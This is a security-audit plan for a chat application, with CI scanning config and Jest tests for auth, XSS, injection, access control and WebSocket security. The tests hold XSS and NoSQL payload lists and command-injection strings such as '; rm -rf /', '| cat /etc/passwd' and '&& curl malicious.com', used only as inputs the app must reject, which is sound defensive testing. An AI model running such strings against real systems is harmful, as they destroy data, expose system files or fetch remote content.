# Step 9.1: Security Audit and Vulnerability Assessment

## Overview

Implement comprehensive security auditing, vulnerability assessment, and penetration testing for the Chat Rooms application to identify and mitigate security risks.

## Security Assessment Framework

### 1. Automated Security Scanning

#### Dependency Vulnerability Scanning

```json
// package.json - Security scripts
{
  "scripts": {
    "security:audit": "npm audit --audit-level=moderate",
    "security:fix": "npm audit fix",
    "security:snyk": "snyk test && snyk monitor",
    "security:deps": "npm run security:audit && npm run security:snyk",
    "security:scan": "npm run security:deps && npm run security:sast && npm run security:container"
  },
  "devDependencies": {
    "snyk": "^1.1200.0",
    "eslint-plugin-security": "^1.7.1",
    "semgrep": "^1.45.0"
  }
}
```

#### Static Application Security Testing (SAST)

```yaml
# .github/workflows/security-scan.yml
name: Security Scan
on:
  push:
    branches: [main, develop]
  pull_request:
    branches: [main]

jobs:
  security:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v3
      
      - name: Run Snyk Security Scan
        uses: snyk/actions/node@master
        env:
          SNYK_TOKEN: ${{ secrets.SNYK_TOKEN }}
        with:
          args: --severity-threshold=high
          
      - name: Run Semgrep Scan
        uses: semgrep/semgrep-action@v1
        with:
          config: >-
            p/security-audit
            p/secrets
            p/owasp-top-ten
            
      - name: Upload Results to GitHub Security
        uses: github/codeql-action/upload-sarif@v2
        if: always()
        with:
          sarif_file: semgrep.sarif
```

### 2. Authentication Security Testing

#### JWT Security Validation

```typescript
// test/security/auth-security.test.ts
describe('Authentication Security Tests', () => {
  describe('JWT Token Security', () => {
    it('should reject expired tokens', async () => {
      const expiredToken = generateExpiredToken();
      
      const response = await request(app)
        .get('/api/profile')
        .set('Authorization', `Bearer ${expiredToken}`)
        .expect(401);
        
      expect(response.body.error).toBe('Token expired');
    });

    it('should reject malformed tokens', async () => {
      const malformedToken = 'invalid.token.here';
      
      const response = await request(app)
        .get('/api/profile')
        .set('Authorization', `Bearer ${malformedToken}`)
        .expect(401);
        
      expect(response.body.error).toBe('Invalid token');
    });

    it('should prevent token replay attacks', async () => {
      const user = await createTestUser();
      const token = await signIn(user);
      
      // Use token
      await request(app)
        .get('/api/profile')
        .set('Authorization', `Bearer ${token}`)
        .expect(200);
        
      // Invalidate token
      await request(app)
        .post('/api/auth/logout')
        .set('Authorization', `Bearer ${token}`)
        .expect(200);
        
      // Try to reuse token
      await request(app)
        .get('/api/profile')
        .set('Authorization', `Bearer ${token}`)
        .expect(401);
    });
  });

  describe('Password Security', () => {
    it('should enforce strong password requirements', async () => {
      const weakPasswords = [
        '123456',
        'password',
        'abc123',
        'qwerty',
        '12345678'
      ];

      for (const password of weakPasswords) {
        const response = await request(app)
          .post('/api/auth/register')
          .send({
            email: 'test@example.com',
            password,
            name: 'Test User'
          })
          .expect(400);
          
        expect(response.body.error).toContain('Password does not meet requirements');
      }
    });

    it('should rate limit login attempts', async () => {
      const attempts = Array(6).fill(0).map(() => 
        request(app)
          .post('/api/auth/login')
          .send({
            email: 'test@example.com',
            password: 'wrongpassword'
          })
      );

      const responses = await Promise.all(attempts);
      const lastResponse = responses[responses.length - 1];
      
      expect(lastResponse.status).toBe(429);
      expect(lastResponse.body.error).toContain('Too many attempts');
    });
  });
});
```

### 3. Input Validation and Sanitization

#### XSS Prevention Testing

```typescript
// test/security/xss-prevention.test.ts
describe('XSS Prevention Tests', () => {
  const xssPayloads = [
    '<script>alert("xss")</script>',
    'javascript:alert("xss")',
    '<img src="x" onerror="alert(\'xss\')">',
    '<svg onload="alert(\'xss\')">',
    '"><script>alert("xss")</script>',
    'data:text/html,<script>alert("xss")</script>'
  ];

  describe('Message Content Sanitization', () => {
    it('should sanitize XSS attempts in messages', async () => {
      const user = await createAuthenticatedUser();
      
      for (const payload of xssPayloads) {
        const response = await request(app)
          .post('/api/messages')
          .set('Authorization', `Bearer ${user.token}`)
          .send({
            content: payload,
            channelId: 'test-channel'
          })
          .expect(201);
          
        expect(response.body.content).not.toContain('<script>');
        expect(response.body.content).not.toContain('javascript:');
        expect(response.body.content).not.toContain('onerror=');
      }
    });
  });

  describe('File Upload Security', () => {
    it('should reject malicious file uploads', async () => {
      const maliciousFiles = [
        { name: 'virus.exe', content: 'malicious content' },
        { name: 'script.js', content: 'alert("xss")' },
        { name: 'exploit.html', content: '<script>alert("xss")</script>' }
      ];

      const user = await createAuthenticatedUser();
      
      for (const file of maliciousFiles) {
        const response = await request(app)
          .post('/api/files/upload')
          .set('Authorization', `Bearer ${user.token}`)
          .attach('file', Buffer.from(file.content), file.name)
          .expect(400);
          
        expect(response.body.error).toContain('File type not allowed');
      }
    });
  });
});
```

### 4. SQL Injection and NoSQL Injection Prevention

#### Database Security Testing

```typescript
// test/security/injection-prevention.test.ts
describe('Injection Prevention Tests', () => {
  describe('NoSQL Injection Prevention', () => {
    const injectionPayloads = [
      '{"$ne": null}',
      '{"$gt": ""}',
      '{"$where": "this.password.match(/.*/)"}',
      '{"$regex": ".*"}',
      '{"$or": [{}]}'
    ];

    it('should prevent NoSQL injection in user queries', async () => {
      for (const payload of injectionPayloads) {
        const response = await request(app)
          .get('/api/users/search')
          .query({ name: payload })
          .expect(400);
          
        expect(response.body.error).toContain('Invalid query parameter');
      }
    });
  });

  describe('Command Injection Prevention', () => {
    const commandInjectionPayloads = [
      '; rm -rf /',
      '| cat /etc/passwd',
      '&& curl malicious.com',
      '`whoami`',
      '$(id)'
    ];

    it('should prevent command injection in file operations', async () => {
      const user = await createAuthenticatedUser();
      
      for (const payload of commandInjectionPayloads) {
        const response = await request(app)
          .post('/api/files/process')
          .set('Authorization', `Bearer ${user.token}`)
          .send({ filename: payload })
          .expect(400);
          
        expect(response.body.error).toContain('Invalid filename');
      }
    });
  });
});
```

### 5. Authorization and Access Control Testing

#### Role-Based Access Control Testing

```typescript
// test/security/access-control.test.ts
describe('Access Control Tests', () => {
  describe('Channel Access Control', () => {
    it('should prevent unauthorized channel access', async () => {
      const admin = await createUser({ role: 'admin' });
      const user = await createUser({ role: 'user' });
      const channel = await createPrivateChannel(admin);

      // User should not access private channel
      const response = await request(app)
        .get(`/api/channels/${channel.id}/messages`)
        .set('Authorization', `Bearer ${user.token}`)
        .expect(403);
        
      expect(response.body.error).toBe('Access denied');
    });

    it('should enforce message deletion permissions', async () => {
      const author = await createUser({ role: 'user' });
      const otherUser = await createUser({ role: 'user' });
      const message = await createMessage(author);

      // Other user should not delete message
      const response = await request(app)
        .delete(`/api/messages/${message.id}`)
        .set('Authorization', `Bearer ${otherUser.token}`)
        .expect(403);
        
      expect(response.body.error).toBe('Insufficient permissions');
    });
  });

  describe('Administrative Functions', () => {
    it('should restrict admin functions to admin users', async () => {
      const user = await createUser({ role: 'user' });
      const targetUser = await createUser({ role: 'user' });

      const adminEndpoints = [
        { method: 'delete', path: `/api/users/${targetUser.id}` },
        { method: 'post', path: '/api/channels/admin' },
        { method: 'get', path: '/api/admin/analytics' },
        { method: 'post', path: '/api/admin/broadcast' }
      ];

      for (const endpoint of adminEndpoints) {
        const response = await request(app)
          [endpoint.method](endpoint.path)
          .set('Authorization', `Bearer ${user.token}`)
          .expect(403);
          
        expect(response.body.error).toBe('Admin access required');
      }
    });
  });
});
```

### 6. Security Headers and HTTPS Testing

#### Security Headers Validation

```typescript
// test/security/security-headers.test.ts
describe('Security Headers Tests', () => {
  it('should include all required security headers', async () => {
    const response = await request(app)
      .get('/api/health')
      .expect(200);

    const requiredHeaders = {
      'x-content-type-options': 'nosniff',
      'x-frame-options': 'DENY',
      'x-xss-protection': '1; mode=block',
      'strict-transport-security': /max-age=\d+/,
      'content-security-policy': /default-src/,
      'referrer-policy': 'strict-origin-when-cross-origin'
    };

    for (const [header, expectedValue] of Object.entries(requiredHeaders)) {
      expect(response.headers[header]).toBeDefined();
      
      if (expectedValue instanceof RegExp) {
        expect(response.headers[header]).toMatch(expectedValue);
      } else {
        expect(response.headers[header]).toBe(expectedValue);
      }
    }
  });

  it('should not expose sensitive information in headers', async () => {
    const response = await request(app)
      .get('/api/health')
      .expect(200);

    const sensitiveHeaders = [
      'x-powered-by',
      'server',
      'x-aspnet-version',
      'x-generator'
    ];

    for (const header of sensitiveHeaders) {
      expect(response.headers[header]).toBeUndefined();
    }
  });
});
```

### 7. WebSocket Security Testing

#### WebSocket Authentication and Authorization

```typescript
// test/security/websocket-security.test.ts
describe('WebSocket Security Tests', () => {
  describe('Connection Authentication', () => {
    it('should reject unauthenticated WebSocket connections', async () => {
      const socket = io('http://localhost:3001', {
        auth: { token: 'invalid-token' }
      });

      const connectionError = await new Promise((resolve) => {
        socket.on('connect_error', resolve);
        socket.on('connect', () => resolve(null));
      });

      expect(connectionError).toBeTruthy();
      socket.disconnect();
    });

    it('should enforce channel permissions for WebSocket events', async () => {
      const user = await createUser({ role: 'user' });
      const privateChannel = await createPrivateChannel();
      
      const socket = io('http://localhost:3001', {
        auth: { token: user.token }
      });

      await new Promise((resolve) => {
        socket.on('connect', resolve);
      });

      const errorPromise = new Promise((resolve) => {
        socket.on('error', resolve);
      });

      socket.emit('join-channel', { channelId: privateChannel.id });
      
      const error = await errorPromise;
      expect(error.message).toBe('Access denied to channel');
      
      socket.disconnect();
    });
  });

  describe('Message Broadcasting Security', () => {
    it('should prevent message spoofing', async () => {
      const user = await createUser({ role: 'user' });
      const otherUser = await createUser({ role: 'user' });
      
      const socket = io('http://localhost:3001', {
        auth: { token: user.token }
      });

      await new Promise((resolve) => {
        socket.on('connect', resolve);
      });

      const errorPromise = new Promise((resolve) => {
        socket.on('error', resolve);
      });

      // Try to send message as another user
      socket.emit('send-message', {
        content: 'Spoofed message',
        userId: otherUser.id,
        channelId: 'test-channel'
      });
      
      const error = await errorPromise;
      expect(error.message).toBe('Cannot send message as another user');
      
      socket.disconnect();
    });
  });
});
```

### 8. Penetration Testing Automation

#### Automated Security Testing Pipeline

```typescript
// scripts/security-tests.ts
import { execSync } from 'child_process';
import { writeFileSync } from 'fs';

interface SecurityTestResult {
  tool: string;
  vulnerabilities: Vulnerability[];
  riskLevel: 'low' | 'medium' | 'high' | 'critical';
}

interface Vulnerability {
  type: string;
  severity: string;
  description: string;
  remediation: string;
}

class SecurityTestRunner {
  async runAllTests(): Promise<SecurityTestResult[]> {
    const results: SecurityTestResult[] = [];

    // Run dependency scan
    results.push(await this.runDependencyCheck());
    
    // Run SAST scan
    results.push(await this.runStaticAnalysis());
    
    // Run container security scan
    results.push(await this.runContainerScan());
    
    // Run dynamic analysis
    results.push(await this.runDynamicAnalysis());

    // Generate security report
    this.generateSecurityReport(results);
    
    return results;
  }

  private async runDependencyCheck(): Promise<SecurityTestResult> {
    try {
      execSync('npm audit --json > audit-results.json', { stdio: 'pipe' });
      const auditResults = JSON.parse(
        require('fs').readFileSync('audit-results.json', 'utf8')
      );

      return {
        tool: 'npm-audit',
        vulnerabilities: this.parseAuditResults(auditResults),
        riskLevel: this.calculateRiskLevel(auditResults)
      };
    } catch (error) {
      console.error('Dependency check failed:', error);
      return {
        tool: 'npm-audit',
        vulnerabilities: [],
        riskLevel: 'low'
      };
    }
  }

  private async runStaticAnalysis(): Promise<SecurityTestResult> {
    try {
      execSync('semgrep --config=p/security-audit --json --output=sast-results.json .', { stdio: 'pipe' });
      const sastResults = JSON.parse(
        require('fs').readFileSync('sast-results.json', 'utf8')
      );

      return {
        tool: 'semgrep',
        vulnerabilities: this.parseSemgrepResults(sastResults),
        riskLevel: this.calculateSemgrepRisk(sastResults)
      };
    } catch (error) {
      console.error('Static analysis failed:', error);
      return {
        tool: 'semgrep',
        vulnerabilities: [],
        riskLevel: 'low'
      };
    }
  }

  private generateSecurityReport(results: SecurityTestResult[]): void {
    const report = {
      timestamp: new Date().toISOString(),
      summary: {
        totalVulnerabilities: results.reduce((sum, result) => sum + result.vulnerabilities.length, 0),
        highestRisk: results.reduce((max, result) => 
          this.getRiskScore(result.riskLevel) > this.getRiskScore(max) ? result.riskLevel : max, 'low'
        ),
        toolsRun: results.map(r => r.tool)
      },
      details: results
    };

    writeFileSync('security-report.json', JSON.stringify(report, null, 2));
    console.log('Security report generated: security-report.json');
  }

  private getRiskScore(level: string): number {
    const scores = { low: 1, medium: 2, high: 3, critical: 4 };
    return scores[level] || 0;
  }
}

// Run security tests
const runner = new SecurityTestRunner();
runner.runAllTests().then((results) => {
  console.log('Security tests completed');
  const criticalIssues = results.filter(r => r.riskLevel === 'critical');
  if (criticalIssues.length > 0) {
    console.error('Critical security issues found!');
    process.exit(1);
  }
});
```

## Implementation Tasks

### Phase 1: Security Infrastructure (Week 1)
- [ ] Set up automated security scanning tools
- [ ] Configure SAST and dependency checking
- [ ] Create security testing framework
- [ ] Implement security headers validation

### Phase 2: Authentication & Authorization Testing (Week 2)
- [ ] Create comprehensive auth security tests
- [ ] Implement access control validation
- [ ] Set up JWT security testing
- [ ] Create role-based permission tests

### Phase 3: Input Validation & Injection Prevention (Week 3)
- [ ] Implement XSS prevention testing
- [ ] Create injection attack prevention tests
- [ ] Set up file upload security validation
- [ ] Create input sanitization tests

### Phase 4: Advanced Security Testing (Week 4)
- [ ] Implement WebSocket security testing
- [ ] Create penetration testing automation
- [ ] Set up continuous security monitoring
- [ ] Generate comprehensive security reports

## Success Criteria

1. **Zero Critical Vulnerabilities**: No critical security issues in production
2. **Comprehensive Coverage**: All security aspects tested and validated
3. **Automated Testing**: Security tests integrated into CI/CD pipeline
4. **Regular Audits**: Monthly security assessments and vulnerability scans
5. **Incident Response**: Security incident detection and response procedures
6. **Compliance**: Meet industry security standards and best practices

## Security Compliance Checklist

- [ ] OWASP Top 10 vulnerability prevention
- [ ] Data encryption in transit and at rest
- [ ] Secure authentication and session management
- [ ] Input validation and output encoding
- [ ] Access control and authorization
- [ ] Security logging and monitoring
- [ ] Incident response procedures
- [ ] Regular security updates and patches

This comprehensive security audit ensures the chat application meets enterprise security standards and protects against common attack vectors.
